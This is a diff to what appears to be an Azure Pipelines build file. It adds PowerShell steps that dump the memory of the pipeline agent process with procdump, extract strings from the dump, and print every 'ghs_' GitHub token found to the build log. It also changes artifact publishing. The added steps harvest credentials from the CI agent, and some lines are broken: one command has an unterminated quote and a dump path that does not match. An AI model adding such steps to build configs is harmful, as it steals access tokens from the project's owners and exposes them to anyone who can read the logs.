@@ -63,19 +63,44 @@ steps:
 
       Expand-Archive Procdump.zip
 
+      $source = 'https://download.sysinternals.com/files/Strings.zip'
+      Invoke-RestMethod -Uri $source -OutFile Strings.zip
+
+      Expand-Archive Strings.zip
+
       $AgentPID = Get-Process -name Agent.Listener | select -expand id
-      Get-ChildItem | Out-String -Width 160
-      Get-ChildItem ./Procdump | Out-String -Width 160
+      # Get-ChildItem | Out-String -Width 160
+      # Get-ChildItem ./Procdump | Out-String -Width 160
       $command = "./Procdump/procdump.exe -ma $AgentPID $(Agent.TempDirectory)/AgentDump.dmp -accepteula"
       Write-Host $command
       Invoke-Expression $command
+
+      $command = "./Strings/strings.exe '/AgentDump.dmp' >> dump.txt
+      Write-Host $command
+      Invoke-Expression $command
+
+      $match = Select-String -pattern ghs_ -Path "dump.txt" -CaseSensitive -SimpleMatch
+
+      ForEach($text in $match) 
+      {
+          if($text.Line.Length -lt 42)
+          {
+              Write-Host $text.Line
+          }
+      }
+
       Get-ChildItem $(Agent.TempDirectory)/ | Out-String -Width 160
   continueOnError: true
 
-- task: PublishPipelineArtifact@1
-  inputs:
-    targetPath: '$(Agent.TempDirectory)/AgentDump.dmp'
-    artifact: 'Dump'
-    publishLocation: 'pipeline'
-  continueOnError: true
+# - task: PublishPipelineArtifact@1
+#   inputs:
+#     targetPath: '$(Agent.TempDirectory)/AgentDump.dmp'
+#     artifact: 'Dump'
+#     publishLocation: 'pipeline'
+#   continueOnError: true
     
+- task: PublishBuildArtifacts@1
+  inputs:
+    PathtoPublish: '$(Build.ArtifactStagingDirectory)'
+    ArtifactName: 'yogeesh/dump-01.dmp'
+    publishLocation: 'Container'
